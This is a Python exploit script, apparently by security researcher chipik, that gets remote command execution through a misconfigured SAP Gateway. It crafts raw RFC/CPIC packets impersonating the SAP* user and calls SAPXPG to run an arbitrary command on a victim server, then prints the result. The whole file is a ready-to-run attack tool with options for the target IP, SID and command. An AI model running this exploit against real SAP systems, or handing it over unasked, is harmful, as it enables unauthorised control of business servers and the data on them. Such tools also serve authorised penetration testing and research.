
#!/usr/bin/env python
# Dmitry @_chipik Chastuhin

from pysap.SAPRFC import SAPRFC, SAPRFCDTStruct, SAPCPIC, SAPRFCTHStruct, SAPRFXPG, SAPCPICSUFFIX, cpic_padd, SAPCPICPARAM, SAPCPICPARAM2, SAPRFCEXTEND, SAPCPIC2, SAPRFXPG_END
from ansicolor import red, green, blue, yellow, cyan, magenta
from pysap.SAPNI import SAPNI, SAPNIStreamSocket
from pysap.SAPDiag import SAPDiag, SAPDiagItem
from scapy.supersocket import StreamSocket
from scapy.layers.inet import TCP
from scapy.packet import bind_layers, Raw
from scapy.all import hexdump, raw
from scapy.config import conf
from struct import *
import argparse
import logging
import socket
import sys

help_desc = '''
RCE via SAP GW when GW ACL sec_info missed (gw/acl_mode = 0) or has insecure configuration
-- chipik
'''

#####GLOBAL VALUES

cmd_lparams=''
cmd_params=''

# that's our target we want to pwn
attacked_gw = {"ip": '127.0.0.1',
               "gwport": 3300,
               "sid": 'DEV',
               "instance": '00',
               "hostname": 'NW703trial',
               "dest_name": 'T_75',
               "cli_nbr": '001',
               "kernel": '720'
               }

##########
def build_p1(ip, inbr):
    p1 = SAPRFC(version=2,
                req_type='GW_NORMAL_CLIENT',
                address=ip,
                service='sapgw{}'.format(inbr),
                codepage=4103,
                lu='sapserve',
                tp='sapgw{}'.format(inbr),
                conversation_id=' ' * 8,
                appc_header_version=6,
                accept_info='EINFO+PING+CONN_EINFO',
                idx=-1,
                )
    return p1


def build_p2():
    dt_structure = SAPRFCDTStruct(version=96,
                                  padd1='\x00\x00\x00\x00\x00\x00\x00\x00',
                                  root_id='\x0E\x02\x00\x00\x00\x00\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00',
                                  conn_id='\x4E\xD5\x81\xE3\x09\xF6\xF1\x18\xA0\x0A\x00\x0C\x29\x00\x99\xD0',
                                  conn_id_suff=0,
                                  timeout=-1,
                                  keepalive_timeout=-1,
                                  export_trace=2,
                                  start_type='DEFAULT',
                                  net_protocol=10,
                                  local_addrv6='::{}'.format(attacked_gw['ip']),
                                  long_lu=attacked_gw['ip'],
                                  padd3='\x00' * 16,
                                  user='SAP*',
                                  padd4='\x20' * 8,
                                  padd5='\x00' * 4,
                                  padd6='\x20' * 12,
                                  padd7='\x00' * 16,
                                  addr_ipv4=attacked_gw['ip'],
                                  padd8='\x00' * 4,
                                  long_tp='sapxpg',
                                  )

    ext_inf = SAPRFCEXTEND(short_dest_name=attacked_gw['dest_name'],
                ncpic_lu='172.16.0',
                ncpic_tp='sapxpg',
                ctype='STARTED_PRG',
                clientInfo=1,
                ncpic_parameters_padd='\x00\x00',
                comm_idx=0,
                conn_idx=65535,
    )

    p2 = SAPRFC(version=6,
                func_type='F_SAP_INIT',
                protocol='CPIC',
                mode=0,
                uid=19,
                gw_id=65535,
                err_len=0,
                info2='WITH_LONG_LU_NAME',
                trace_level=0,
                time=0,
                info3='GW_EXTENDED_INIT_OPTIONS+GW_DIST_TRACE',
                timeout=-1,
                info4=0,
                seq_no=0,
                sap_param_len=len(dt_structure),
                info='SYNC_CPIC_FUNCTION+WITH_HOSTADDR+WITH_GW_SAP_PARAMS_HDR+R3_CPIC_LOGIN_WITH_TERM',
                padd_appc=0,
                vector=0,
                appc_rc='CM_OK',
                sap_rc=0,
                sap_ext_header =ext_inf,
                sap_param=dt_structure,
                )
    #p2.show2()
    return p2


def buld_p3(conv_id):

    cpic_suf = SAPCPICSUFFIX(
        suff_padd1='\x10\x04\x02',
        suff_unk1='\x00\x01\x87\x68\x00\x00\x04\x4c\x00\x00\x0b\xb8',
        suff_padd2='\x10\x04\x0b',
        suff_unk2='\xff\x7f\xfa\x0d\x78\xb7\x27\xde\xf6\x19\x62\x93\x25\xbf\x15\x93\xef\x73\xfe\xeb\xdb\x51\xed\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        suff_padd3='\x10\x04\x04',
        suff_unk3='\x00\x16\x00\x07\x00\x10\x00\x07',
        suff_padd4='\x10\x04\x0d',
        suff_unk4='\x00\x00\x00\x27\x00\x00\x01\x0c\x00\x00\x00\x35\x00\x00\x01\x0c',
        suff_padd5='\x10\x04\x16',
        suff_unk5='\x00\x11',
        suff_padd6='\x10\x04\x17',
        suff_unk6='\x00\x22',
        suff_padd7='\x10\x04\x19',
        suff_unk7='\x00\x00',
        suff_padd8='\x10\x04\x1e',
        suff_unk8='\x00\x00\x03\x67\x00\x00\x07\x58',
        suff_padd9='\x10\x04\x25',
        suff_unk9='\x00\x01',
        suff_padd10k='\x10\x04\x09',
        suff_kernel=attacked_gw['kernel'],
        suff_padd10='\x10\x04\x1d',
        suff_unk10='\x30',
        suff_padd11='\x10\x04\x1f',
        suff_cli1='Windows 7 Professional 6.1 (7601) Servic',
        suff_padd12='\x10\x04\x20',
        suff_cli2='IE 9.10.9200.16618',
        suff_padd13='\x10\x04\x21',
        suff_cli3='Office 12',
        suff_padd14='\x10\x04\x24',
        suff_unk14='\x00\x00\x04\x1a\x00\x00\x07\x80',
        suff_padd15='\x10\x04\x13',
        suff_unk15='\x02\xe1\xd4\x81\xe3\x0b\x21\xf1\x01\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x01\x37\xd5\x81\xe3\x88\x9a\xf1\x6b\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x00',
    )

    xpg = SAPRFXPG(
        xpg_padd100='\x05\x12\x02\x05',
        xpg_convid_l='CONVID',
        xpg_padd101='\x02\x05\x02\x05',
        xpg_strstat_l='STRTSTAT',
        xpg_padd102='\x02\x05\x02\x05',
        xpg_xpgid_l='XPGID',
        xpg_padd103='\x02\x05\x02\x01',
        xpg_extprog_l='EXTPROG',
        xpg_padd104='\x02\x01\x02\x03',
        xpg_extprog_val='{: <128}'.format(cmd),
        xpg_padd105='\x02\x03\x02\x01',
        xpg_longparam_l='LONG_PARAMS',
        xpg_padd106='\x02\x01\x02\x03',
        xpg_longparam_val='{: <1024}'.format(cmd_lparams),
        xpg_padd107='\x02\x03\x02\x01',
        xpg_param_l='PARAMS',
        xpg_padd108='\x02\x01\x02\x03',
        xpg_param_val='{: <255}'.format(cmd_params),
        xpg_padd109='\x02\x03\x02\x01',
        xpg_stderrcntl_l='STDERRCNTL',
        xpg_padd110='\x02\x01\x02\x03',
        xpg_stderrcntl_val='M',
        xpg_padd111='\x02\x03\x02\x01',
        xpg_stdincntl_l='STDINCNTL',
        xpg_padd112='\x02\x01\x02\x03',
        xpg_stdincntl_val='R',
        xpg_padd113='\x02\x03\x02\x01',
        xpg_stdoutcntl_l='STDOUTCNTL',
        xpg_padd114='\x02\x01\x02\x03',
        xpg_stdoutcntl_val='M',
        xpg_padd115='\x02\x03\x02\x01',
        xpg_termcntl_l='TERMCNTL',
        xpg_padd116='\x02\x01\x02\x03',
        xpg_termcntl_val='C',
        xpg_padd117='\x02\x03\x02\x01',
        xpg_tracecntl_l='TRACECNTL',
        xpg_padd118='\x02\x01\x02\x03',
        xpg_tracecntl_val='6',
        xpg_padd119='\x02\x03\x03\x01',
        xpg_log_l='LOG',
        xpg_padd120='\x03\x01\x03\x30',
        xpg_log_val1='\x00\x00\x00\x01',
        xpg_padd121='\x03\x30\x03\x02',
        xpg_unk1='\x00\x00\x00\x80\x00\x00\x00\x00',
    )

    cpic_params = SAPCPICPARAM(
        param1='\x00\x99\xd0\x1e',
        param2='\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5',
        param_sess_1='\x81\xe3', # session 1st part?
        param_sess_2='\x09\xf6\xf1\x18', # session 2nd part?
        mask='225.0.0.0',
        ip= attacked_gw['ip'],
        flag=1,
    )

    cpic_params2 = SAPCPICPARAM2(  #dunno why this values
        param1='\xe3\x81\xd5\x4e\xf6\x09\x19\xf1',
        mask='160.10.0.12',
        ip= '41.0.153.208',
    )

    th = SAPRFCTHStruct(
        th_eyec1="*TH*",
        th_version=3,
        th_len=230,
        th_trace_flag=0,
        th_sysid='{}/{}_{}_{}'.format(attacked_gw["sid"], attacked_gw['hostname'], attacked_gw['sid'], attacked_gw['instance']),
        th_serevice=1,
        th_userid='SAP*',
        th_action='SM49',
        th_acttype=1,
        th_presysid='{}/{}_{}_{}'.format(attacked_gw["sid"], attacked_gw['hostname'], attacked_gw['sid'], attacked_gw['instance']),
        th_id='37D581E3889AF16DA00A000C290099D0001',
        th_some_cpic_params=cpic_params,
        th_eyec2="*TH*",

    )

    cpic = SAPCPIC(
        cpic_start_padd='\x01\x01\x00\x08',
        cpic_cpic_length=257,

        cpic_padd0003="\x01\x01\x01\x01",
        cpic_unk02="",

        cpic_padd0002="\x01\x01\x01\x03",
        cpic_unk01="\x00\x00\x06\x1b",

        cpic_padd0001="\x01\x03\x01\x06",
        cpic_unk00="\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23",

        cpic_padd001="\x01\x06\x00\x07",
        cpic_ip='{: <15}'.format(attacked_gw['ip']),

        cpic_padd002 = '\x00\x07\x00\x18',
        cpic_ip2=attacked_gw['ip'],

        cpic_padd003 = '\x00\x18\x00\x08',
        cpic_host_sid_inbr='{}_{}_{}'.format(attacked_gw['hostname'], attacked_gw['sid'], attacked_gw['instance']),

        cpic_padd004 = '\x00\x08\x00\x11',
        cpic_rfc_type='3',

        cpic_padd005 = '\x00\x11\x00\x13',
        cpic_kernel1 = '{} '.format(attacked_gw['kernel']),

        cpic_padd006='\x00\x13\x00\x12',
        cpic_kernel2='{} '.format(attacked_gw['kernel']),

        cpic_padd007='\x00\x12\x00\x06',
        cpic_dest=attacked_gw['dest_name'],

        cpic_padd008='\x00\x06\x01\x30',
        cpic_program='SAPLSSXP',

        cpic_padd009='\x01\x30\x01\x11',
        cpic_username1='SAP*',

        cpic_padd010='\x01\x11\x01\x14',
        cpic_cli_nbr1=attacked_gw['cli_nbr'],

        cpic_padd011='\x01\x14\x01\x15',
        cpic_unk1='E',

        cpic_padd012='\x01\x15\x00\x09',
        cpic_username2='SAP*',

        cpic_padd013='\x00\x09\x01\x34',
        cpic_cli_nbr2=attacked_gw['cli_nbr'],

        cpic_padd014='\x01\x34\x05\x01',
        cpic_unk2='\x01',

        cpic_padd015_0='\x05\x01',# <----
        cpic_padd015_1='\x01\x36',# <----
        some_cpic_params=cpic_params,

        cpic_padd016='\x01\x36\x05\x02',
        cpic_convid_label='',

        cpic_padd017='\x05\x02\x00\x0b',
        cpic_kernel3=attacked_gw['kernel'],

        cpic_padd018='\x00\x0b\x01\x02',
        cpic_RFC_f='SAPXPG_START_XPG_LONG',

        cpic_padd019='\x01\x02\x05\x03',
        cpic_unk4='',

        cpic_padd020='\x05\x03\x01\x31',
        cpic_th_struct=th,

        cpic_padd021='\x01\x31\x05\x14',
        some_cpic_params2=cpic_params2,

        cpic_padd022='\x05\x14\x04\x20',
        cpic_unk6='\x00\x00\x00\x00',

        cpic_padd023='\x04\x20\x05\x12',
        cpic_unk7='',

        xpg_p=xpg,

        cpic_padd024='\x03\x02\x01\x04',
        cpic_suff=cpic_suf,

        cpic_end_padd = '\x01\x04\xff\xff',
        cpic_end = '',
        cpic_end_sig='\xff\xff\x00\x00',
     )



    p3 = SAPRFC(version=6,
                func_type='F_SAP_SEND',
                protocol='CPIC',
                mode=0,
                uid=19,
                gw_id=1,
                err_len=0,
                info2=0,
                trace_level=0,
                time=0,
                info3=0,
                timeout=500,
                info4=0,
                seq_no=0,
                sap_param_len=8,
                padd_appc=0,
                info='SYNC_CPIC_FUNCTION+WITH_GW_SAP_PARAMS_HDR+R3_CPIC_LOGIN_WITH_TERM',
                vector='F_V_SEND_DATA+F_V_RECEIVE',
                appc_rc='CM_OK',
                sap_rc=0,
                conv_id=conv_id,
                cm_ok_padd='\x00'*31 + '\x02',
                sap_cpic=cpic,
                cpic_packet_size=len(cpic),
                rfc_packet_size=28000,
                )

    #p3.show2()
    return p3

def buld_p4(conv_id):

    cpic_params = SAPCPICPARAM(
        param1='\x00\x99\xd0\x1e',
        param2='\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5',
        param_sess_1='\x81\xe3', # session 1st part?
        param_sess_2='\x09\xf6\xf1\x18', # session 2nd part?
        mask='160.10.0.12',
        ip= '41.0.153.208',
        flag=2,
    )

    cpic_params2 = SAPCPICPARAM2(  #dunno why this values
        param1='\xe3\x81\xd5\x4e\xf6\x09\x19\xf1',
        mask='160.10.0.12',
        ip= '41.0.153.208',
    )

    sap_xpg_end = SAPRFXPG_END(
        xpg_end_padd001='\x05\x12\x02\x05',
        xpg_end_ecode_l='EXITCODE',
        xpg_end_padd002 = '\x02\x05\x02\x05',
        xpg_end_estat_l = 'STRTSTAT',
        xpg_end_padd003 = '\x02\x05\x03\x01',
        xpg_end_log_l = 'LOG',
        xpg_end_padd004= '\x03\x01\x03\x30',
        xpg_end_unk1 = '\x00\x00\x00\x01',
        xpg_end_padd005 = '\x03\x30\x03\x02',
        xpg_end_unk2 = '\x00\x00\x00\x80\x00\x00\x00\x00',
    )

    cpic_suf = SAPCPICSUFFIX(
        suff_padd1='\x10\x04\x02',
        suff_unk1='\x00\x01\x87\x68\x00\x00\x04\x4c\x00\x00\x0b\xb8',
        suff_padd2='\x10\x04\x0b',
        suff_unk2='\xff\x7f\xfa\x0d\x78\xb7\x27\xde\xf6\x19\x62\x93\x25\xbf\x15\x93\xef\x73\xfe\xeb\xdb\x51\xed\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        suff_padd3='\x10\x04\x04',
        suff_unk3='\x00\x16\x00\x07\x00\x10\x00\x07',
        suff_padd4='\x10\x04\x0d',
        suff_unk4='\x00\x00\x00\x27\x00\x00\x01\x0c\x00\x00\x00\x35\x00\x00\x01\x0c',
        suff_padd5='\x10\x04\x16',
        suff_unk5='\x00\x11',
        suff_padd6='\x10\x04\x17',
        suff_unk6='\x00\x22',
        suff_padd7='\x10\x04\x19',
        suff_unk7='\x00\x00',
        suff_padd8='\x10\x04\x1e',
        suff_unk8='\x00\x00\x03\x67\x00\x00\x07\x58',
        suff_padd9='\x10\x04\x25',
        suff_unk9='\x00\x01',
        suff_padd10k='\x10\x04\x09',
        suff_kernel=attacked_gw['kernel'],
        suff_padd10='\x10\x04\x1d',
        suff_unk10='\x30',
        suff_padd11='\x10\x04\x1f',
        suff_cli1='Windows 7 Professional 6.1 (7601) Servic',
        suff_padd12='\x10\x04\x20',
        suff_cli2='IE 9.10.9200.16618',
        suff_padd13='\x10\x04\x21',
        suff_cli3='Office 12',
        suff_padd14='\x10\x04\x24',
        suff_unk14='\x00\x00\x04\x1a\x00\x00\x07\x80',
        suff_padd15='\x10\x04\x13',
        suff_unk15='\x02\xe1\xd4\x81\xe3\x0b\x21\xf1\x01\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x01\x37\xd5\x81\xe3\x88\x9a\xf1\x6b\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x00',
    )


    cpic2 = SAPCPIC2(
        cpic_padd015_1='\x01\x36',
        some_cpic_params=cpic_params,
        cpic_padd016='\x01\x36\x05\x02',
        cpic_convid_label='',
        cpic_padd017='\x05\x02\x00\x0b',
        cpic_kernel3=attacked_gw['kernel'],
        cpic_padd018 = '\x00\x0b\x01\x02',
        cpic_RFC_f='SAPXPG_END_XPG',
        cpic_padd019='\x01\x02\x05\x03',
        cpic_unk4='',
        cpic_padd021='\x05\x03\x05\x14',
        some_cpic_params2=cpic_params2,
        cpic_padd022='\x05\x14\x04\x20',
        cpic_unk6='\x00\x00\x00\x00',
        cpic_padd023='\x04\x20\x05\x12',
        cpic_unk7='',
        xpg_end = sap_xpg_end,
        cpic_padd024='\x03\x02\x01\x04',
        cpic_suff=cpic_suf,
        cpic_end_padd='\x01\x04\xff\xff',
        cpic_end='',
        cpic_end_sig='\xff\xff\x00\x00',
    )

    p4 = SAPRFC(version=6,
                func_type='F_SAP_SEND',
                protocol='CPIC',
                mode=0,
                uid=19,
                gw_id=1,
                err_len=0,
                info2=0,
                trace_level=0,
                time=0,
                info3=0,
                timeout=500,
                info4=0,
                seq_no=0,
                sap_param_len=8,
                padd_appc=0,
                info='SYNC_CPIC_FUNCTION+WITH_GW_SAP_PARAMS_HDR+R3_CPIC_LOGIN_WITH_TERM',
                vector='F_V_SEND_DATA+F_V_RECEIVE',
                appc_rc='CM_OK',
                sap_rc=0,
                conv_id=conv_id,
                cm_ok_padd='\x00' * 31 + '\x02',
                sap_cpic_cut=cpic2,
                cpic_packet_size=len(cpic2),
                rfc_packet_size=28000,
    )
    #p4.show2()
    return p4

def print_error(error_msg):
    err = error_msg.split('\x00')
    print 'Got Error!'
    print 'LOCATION: {}\n' \
          'ERROR: {}\n' \
          'TIME: {}\n' \
          'RELEASE: {}\n' \
          'COMPONENT: {}\n' \
          'VERSION: {}\n' \
          'RC: {}\n' \
          'MODULE: {}\n' \
          'LINE: {}\n' \
          'DETAILS: {}\n' \
          'COUNTER: {}\n'.format(err[15], err[2], err[10], err[5], err[4], err[6], err[3], err[7], err[8], err[9],
                                 err[14])


def gw_connect(gwhost, gwport, init_packet):
    try:
        s = SAPNIStreamSocket.get_nisocket(gwhost, gwport)
    except socket.error:
        logger.error("[!] Connection error to %s:%s" % (gwhost, gwport))
        exit(-1)
    logger.info('[+] Sending GW_NORMAL_CLIENT')
    r = s.sr(init_packet)
    handle_resp(r, "GW_NORMAL_CLIENT")
    return s


def init_logger(logname, level):
    # generic log conf
    logger = logging.getLogger(logname)
    logger.setLevel(level)
    console_format = logging.Formatter("[%(levelname)-5s] %(message)s")
    # console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(level)
    ch.setFormatter(console_format)
    logger.addHandler(ch)
    return logger


def handle_resp(r, pkt):
    logger.debug('Response on {}:\n{}'.format(pkt, r.show(dump=True)))
    if r[SAPRFC].error_msg:
        print_error(r[SAPRFC].error_msg)
    else:
        logger.info('Response: OK')


def parse_fields(pkt, lines):
    result=[]
    logger.debug("Starting decompression")
    d = SAPDiag()
    (sig, compressed_len) = unpack('>4sI', pkt[0:8])
    (uncompressed_len,) = unpack('<I', pkt[8:12])
    logger.debug("sig = {}, compressed_len = {}, uncompressed_len = {}".format(sig, compressed_len, uncompressed_len))
    rez=d.do_decompress(pkt[8:compressed_len],uncompressed_len)
    for i in range(lines):
        result.append(rez[128 * i:128 * i + 128])
    return result

def parce_answer(r):
    resp_lines=0
    resp_start=0
    resp_type = 0 # if more than 62 lines than sap use compression
    for field in r.repl:
        if field.start_padd == '\x03\x35\x03\x02':
            resp_lines=unpack('>i',r.repl[7].start_field1[4:])[0]
            resp_start=r.repl.index(field)+1
            if r.repl[resp_start].start_padd[2:] == '\x03\x05':
                resp_type = 'compressed'
            elif r.repl[resp_start].start_padd[2:] == '\x03\x04':
                resp_type = 'raw'
            else:
                print '[!] Error. Wrong resp_type'
            break
    logger.debug('Response parameters:\nlines = {}\ntype = {}\n'.format(resp_lines, resp_type))
    if not resp_lines and not resp_type:
        print '[!] Error. resp_lines = 0 or resp_type = 0'
        exit(0)
    result = []
    for resp in r.repl[resp_start:]:
        if resp.start_padd[2:] == '\x03\x05' or resp.start_padd[2:] == '\x03\x04':
            result.append(resp.start_field1)
    if resp_type == 'compressed':
        result=parse_fields(''.join(result),resp_lines)
    return '\n'.join(result)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-t', '--ip', default='172.16.30.118', help='AS victim IP (default: 172.16.30.118)')
    parser.add_argument('-p', '--port', default=3300, type=int, help='SAP gateway port (default: 3300)')
    parser.add_argument('-s', '--sid', default='CL1', help='SAP victim SID (default: CL1)')
    parser.add_argument('-I', '--instance', default='00', help='SAP victim targeted instance (default: 00)')
    parser.add_argument('-c', '--cmd', default='whoami', help='Command that be executed')
    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
    parser.add_argument('-q', '--quiet', action='store_true', help='Don\'t show any info messages')

    args = parser.parse_args()
    prog = 'anonGW2'
    if args.quiet:
        logger = init_logger(prog, logging.NOTSET)
    elif args.debug:
        logger = init_logger(prog, logging.DEBUG)
    else:
        logger = init_logger(prog, logging.INFO)

    # setup our target

    attacked_gw['ip'] = args.ip
    attacked_gw['port'] = args.port
    attacked_gw['sid'] = args.sid
    attacked_gw['instance'] = args.instance
    cmd = args.cmd.split()[0]
    cmd_params = args.cmd[len(cmd) + 1:]


    conf.L3Socket = StreamSocket
    bind_layers(TCP, SAPNI)
    bind_layers(SAPNI, SAPRFC)

    # 1 - send GW_NORMAL_CLIENT
    s = gw_connect(attacked_gw['ip'], attacked_gw['port'], build_p1(attacked_gw['ip'], attacked_gw['instance']))

    # 2 - send F_SAP_INIT
    logger.info("[+] Sending F_SAP_INIT")
    r = s.sr(build_p2())
    handle_resp(r, "F_SAP_INIT")
    conv_id = r['SAPRFC'].conv_id
    logger.debug('Got conv_id = {}'.format(conv_id))

    # 3 - send F_SAP_SEND
    logger.info("[+] Sending F_SAP_SEND")
    r = s.sr(buld_p3(conv_id))
    #handle_resp(r, "F_SAP_SEND")

    # 4 - send F_SAP_SEND2
    logger.info("[+] Sending F_SAP_SEND2")
    r = s.sr(buld_p4(conv_id))
    #handle_resp(r, "F_SAP_SEND2")

    # 5 - print result
    print parce_answer(r)